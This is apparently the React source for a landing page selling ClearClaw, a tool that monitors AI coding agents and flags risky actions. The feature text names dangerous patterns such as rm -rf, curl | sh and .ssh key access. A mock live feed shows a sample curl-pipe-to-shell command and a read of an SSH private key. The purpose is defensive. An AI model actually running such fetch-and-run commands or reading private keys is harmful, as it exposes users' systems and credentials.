import Link from "next/link";

const CHECKOUT_URL = process.env.NEXT_PUBLIC_LEMON_SQUEEZY_CHECKOUT_URL ?? "#pricing";

const features = [
  {
    icon: (
      <svg className="h-6 w-6" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor">
        <path strokeLinecap="round" strokeLinejoin="round" d="M3.75 13.5l10.5-11.25L12 10.5h8.25L9.75 21.75 12 13.5H3.75z" />
      </svg>
    ),
    title: "Real-time event stream",
    description:
      "Every file read, shell command, and network call made by Claude Code or OpenClaw appears in your dashboard within milliseconds.",
  },
  {
    icon: (
      <svg className="h-6 w-6" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor">
        <path strokeLinecap="round" strokeLinejoin="round" d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.95 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126zM12 15.75h.007v.008H12v-.008z" />
      </svg>
    ),
    title: "Anomaly detection",
    description:
      "Automatic rule-based scoring flags dangerous patterns — rm -rf, curl | sh, access to .ssh keys, or calls to suspicious hosts — before damage is done.",
  },
  {
    icon: (
      <svg className="h-6 w-6" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor">
        <path strokeLinecap="round" strokeLinejoin="round" d="M10.5 6h9.75M10.5 6a1.5 1.5 0 11-3 0m3 0a1.5 1.5 0 10-3 0M3.75 6H7.5m3 12h9.75m-9.75 0a1.5 1.5 0 01-3 0m3 0a1.5 1.5 0 00-3 0m-3.75 0H7.5m9-6h3.75m-3.75 0a1.5 1.5 0 01-3 0m3 0a1.5 1.5 0 00-3 0m-9.75 0h9.75" />
      </svg>
    ),
    title: "Plain-English translations",
    description:
      "Raw hook payloads are translated into human-readable sentences so you always know exactly what your agent did — no JSON spelunking required.",
  },
  {
    icon: (
      <svg className="h-6 w-6" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor">
        <path strokeLinecap="round" strokeLinejoin="round" d="M3 13.125C3 12.504 3.504 12 4.125 12h2.25c.621 0 1.125.504 1.125 1.125v6.75C7.5 20.496 6.996 21 6.375 21h-2.25A1.125 1.125 0 013 19.875v-6.75zM9.75 8.625c0-.621.504-1.125 1.125-1.125h2.25c.621 0 1.125.504 1.125 1.125v11.25c0 .621-.504 1.125-1.125 1.125h-2.25a1.125 1.125 0 01-1.125-1.125V8.625zM16.5 4.125c0-.621.504-1.125 1.125-1.125h2.25C20.496 3 21 3.504 21 4.125v15.75c0 .621-.504 1.125-1.125 1.125h-2.25a1.125 1.125 0 01-1.125-1.125V4.125z" />
      </svg>
    ),
    title: "Session history",
    description:
      "Browse and replay past agent sessions chronologically. Understand what an agent did during a long autonomous run without sifting through terminal logs.",
  },
  {
    icon: (
      <svg className="h-6 w-6" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor">
        <path strokeLinecap="round" strokeLinejoin="round" d="M9 12.75L11.25 15 15 9.75m-3-7.036A11.959 11.959 0 013.598 6 11.99 11.99 0 003 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285z" />
      </svg>
    ),
    title: "Permission profiles",
    description:
      "Define what your agent is and isn't allowed to do. Get alerted the moment it steps outside its allowed scope — before it causes problems.",
  },
  {
    icon: (
      <svg className="h-6 w-6" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor">
        <path strokeLinecap="round" strokeLinejoin="round" d="M6.75 7.5l3 2.25-3 2.25m4.5 0h3m-9 8.25h13.5A2.25 2.25 0 0021 18V6a2.25 2.25 0 00-2.25-2.25H5.25A2.25 2.25 0 003 6v12a2.25 2.25 0 002.25 2.25z" />
      </svg>
    ),
    title: "Zero-config install",
    description:
      "One command — npx clearclaw install — registers the hook, installs a local daemon, and streams events to your dashboard. No code changes needed.",
  },
];

const steps = [
  { number: "01", title: "Install the daemon", body: "Run npx clearclaw install on any machine running Claude Code or OpenClaw. The CLI registers a hook and launches a background daemon in under 30 seconds." },
  { number: "02", title: "Watch in real time", body: "Every agent action — file edits, commands, network calls — is captured, translated, and streamed live to your ClearClaw dashboard." },
  { number: "03", title: "Review & act", body: "Browse session history, tweak permission profiles, and get instant alerts when anomalous behavior is detected." },
];

const PRO_FEATURES = [
  "Up to 5 connected devices",
  "Unlimited event history",
  "Plain-English event feed",
  "Anomaly scoring & real-time alerts",
  "Full session history & replay",
  "Permission profiles",
  "Priority support",
];

export default function LandingPage(): JSX.Element {
  return (
    <div className="min-h-screen bg-slate-950 text-slate-100">
      {/* Nav */}
      <header className="mx-auto flex max-w-6xl items-center justify-between px-6 py-5">
        <span className="text-lg font-bold tracking-tight">
          Agent<span className="text-brand-500">Audit</span>
        </span>
        <nav className="flex items-center gap-6 text-sm text-slate-400">
          <a href="#features" className="hover:text-slate-100 transition-colors">Features</a>
          <a href="#how-it-works" className="hover:text-slate-100 transition-colors">How it works</a>
          <a href="#pricing" className="hover:text-slate-100 transition-colors">Pricing</a>
          <Link
            href="/dashboard"
            className="rounded-md bg-brand-600 px-3 py-1.5 text-sm font-semibold text-white hover:bg-brand-500 transition-colors"
          >
            Dashboard
          </Link>
        </nav>
      </header>

      {/* Hero */}
      <section className="mx-auto max-w-6xl px-6 pb-24 pt-20 text-center">
        <div className="mb-4 inline-flex items-center gap-2 rounded-full border border-slate-800 bg-slate-900 px-3 py-1 text-xs text-slate-400">
          <span className="h-1.5 w-1.5 rounded-full bg-emerald-400" />
          Now monitoring Claude Code &amp; OpenClaw
        </div>
        <h1 className="mx-auto max-w-3xl text-5xl font-extrabold leading-tight tracking-tight sm:text-6xl">
          Little Snitch for{" "}
          <span className="bg-gradient-to-r from-brand-500 to-violet-400 bg-clip-text text-transparent">
            AI agents
          </span>
        </h1>
        <p className="mx-auto mt-6 max-w-2xl text-lg text-slate-400">
          Monitor every Claude Code and OpenClaw action in plain English, detect anomalies in real time, and review session history — all from one dashboard.
        </p>
        <div className="mt-10 flex flex-col items-center justify-center gap-4 sm:flex-row">
          <Link
            href="/connect"
            className="rounded-lg bg-brand-600 px-6 py-3 text-base font-semibold hover:bg-brand-500 transition-colors"
          >
            Connect a device — it&apos;s free
          </Link>
          <a
            href="#pricing"
            className="rounded-lg border border-slate-700 px-6 py-3 text-base font-semibold hover:bg-slate-900 transition-colors"
          >
            See pricing
          </a>
        </div>
        {/* Terminal preview */}
        <div className="mx-auto mt-16 max-w-2xl rounded-xl border border-slate-800 bg-slate-900 text-left shadow-2xl">
          <div className="flex items-center gap-1.5 border-b border-slate-800 px-4 py-3">
            <span className="h-3 w-3 rounded-full bg-red-500/70" />
            <span className="h-3 w-3 rounded-full bg-yellow-500/70" />
            <span className="h-3 w-3 rounded-full bg-emerald-500/70" />
            <span className="ml-3 text-xs text-slate-500">ClearClaw — live feed</span>
          </div>
          <div className="space-y-2 px-4 py-4 font-mono text-xs">
            <div className="flex items-start gap-3">
              <span className="mt-0.5 shrink-0 rounded bg-emerald-900/60 px-1.5 py-0.5 text-[10px] font-bold text-emerald-400">LOW</span>
              <span className="text-slate-300">claude_code read file: src/components/EventFeed.tsx</span>
            </div>
            <div className="flex items-start gap-3">
              <span className="mt-0.5 shrink-0 rounded bg-emerald-900/60 px-1.5 py-0.5 text-[10px] font-bold text-emerald-400">LOW</span>
              <span className="text-slate-300">claude_code executed command: pnpm build</span>
            </div>
            <div className="flex items-start gap-3">
              <span className="mt-0.5 shrink-0 rounded bg-red-900/60 px-1.5 py-0.5 text-[10px] font-bold text-red-400">HIGH</span>
              <span className="text-slate-300">claude_code executed command: curl https://example.com/setup.sh | sh</span>
            </div>
            <div className="flex items-start gap-3">
              <span className="mt-0.5 shrink-0 rounded bg-yellow-900/60 px-1.5 py-0.5 text-[10px] font-bold text-yellow-400">MED</span>
              <span className="text-slate-300">claude_code read file: /Users/dev/.ssh/id_rsa</span>
            </div>
          </div>
        </div>
      </section>

      {/* Features */}
      <section id="features" className="border-t border-slate-800 bg-slate-900/40 py-24">
        <div className="mx-auto max-w-6xl px-6">
          <h2 className="text-center text-3xl font-bold">Everything you need to trust your AI agents</h2>
          <p className="mx-auto mt-4 max-w-xl text-center text-slate-400">
            ClearClaw gives you full visibility into what your AI coding agents are doing — without slowing them down.
          </p>
          <div className="mt-14 grid gap-8 sm:grid-cols-2 lg:grid-cols-3">
            {features.map((f) => (
              <div key={f.title} className="rounded-xl border border-slate-800 bg-slate-900 p-6">
                <div className="mb-4 inline-flex rounded-lg bg-brand-600/20 p-2.5 text-brand-500">
                  {f.icon}
                </div>
                <h3 className="mb-2 font-semibold">{f.title}</h3>
                <p className="text-sm text-slate-400">{f.description}</p>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* How it works */}
      <section id="how-it-works" className="py-24">
        <div className="mx-auto max-w-6xl px-6">
          <h2 className="text-center text-3xl font-bold">Up and running in 30 seconds</h2>
          <div className="mt-14 grid gap-8 md:grid-cols-3">
            {steps.map((s) => (
              <div key={s.number} className="relative pl-14">
                <span className="absolute left-0 top-0 text-4xl font-extrabold text-slate-800">{s.number}</span>
                <h3 className="mb-2 font-semibold">{s.title}</h3>
                <p className="text-sm text-slate-400">{s.body}</p>
              </div>
            ))}
          </div>
          <div className="mt-12 flex justify-center">
            <pre className="rounded-lg border border-slate-800 bg-slate-900 px-6 py-3 text-sm text-emerald-400">
              npx clearclaw install
            </pre>
          </div>
        </div>
      </section>

      {/* Pricing */}
      <section id="pricing" className="border-t border-slate-800 bg-slate-900/40 py-24">
        <div className="mx-auto max-w-6xl px-6">
          <h2 className="text-center text-3xl font-bold">One plan. Everything included.</h2>
          <p className="mx-auto mt-4 max-w-md text-center text-slate-400">
            Full access to every feature from day one. No tiers, no limits hidden behind paywalls.
          </p>
          <div className="mx-auto mt-14 max-w-sm">
            <div className="relative flex flex-col rounded-xl border border-brand-500 bg-slate-900 p-8 ring-1 ring-brand-500/50">
              <div className="mb-6">
                <h3 className="text-lg font-bold">Pro</h3>
                <div className="mt-2 flex items-end gap-1">
                  <span className="text-4xl font-extrabold">$9</span>
                  <span className="mb-1 text-sm text-slate-400">/month</span>
                </div>
                <p className="mt-2 text-sm text-slate-400">
                  For developers and teams running AI agents in production.
                </p>
              </div>
              <ul className="mb-8 flex-1 space-y-3 text-sm">
                {PRO_FEATURES.map((feat) => (
                  <li key={feat} className="flex items-start gap-2">
                    <svg className="mt-0.5 h-4 w-4 shrink-0 text-emerald-400" fill="none" viewBox="0 0 24 24" strokeWidth={2.5} stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" d="M4.5 12.75l6 6 9-13.5" />
                    </svg>
                    <span>{feat}</span>
                  </li>
                ))}
              </ul>
              <Link
                href={CHECKOUT_URL}
                className="block rounded-lg bg-brand-600 py-3 text-center text-sm font-semibold text-white transition-colors hover:bg-brand-500"
              >
                Get started — $9/month
              </Link>
            </div>
          </div>
        </div>
      </section>

      {/* CTA Banner */}
      <section className="py-24">
        <div className="mx-auto max-w-3xl px-6 text-center">
          <h2 className="text-3xl font-bold">Know what your AI agent is doing — right now</h2>
          <p className="mt-4 text-slate-400">
            Join developers who use ClearClaw to keep autonomous AI agents accountable.
          </p>
          <Link
            href="/connect"
            className="mt-8 inline-block rounded-lg bg-brand-600 px-8 py-3 text-base font-semibold hover:bg-brand-500 transition-colors"
          >
            Connect a device for free
          </Link>
        </div>
      </section>

      {/* Footer */}
      <footer className="border-t border-slate-800 py-8">
        <div className="mx-auto flex max-w-6xl flex-col items-center justify-between gap-4 px-6 text-sm text-slate-500 sm:flex-row">
          <span>
            &copy; {new Date().getFullYear()} ClearClaw. All rights reserved.
          </span>
          <div className="flex gap-6">
            <Link href="/dashboard" className="hover:text-slate-300 transition-colors">Dashboard</Link>
            <Link href="/connect" className="hover:text-slate-300 transition-colors">Install</Link>
            <a href="mailto:support@clearclaw.dev" className="hover:text-slate-300 transition-colors">Support</a>
          </div>
        </div>
      </footer>
    </div>
  );
}
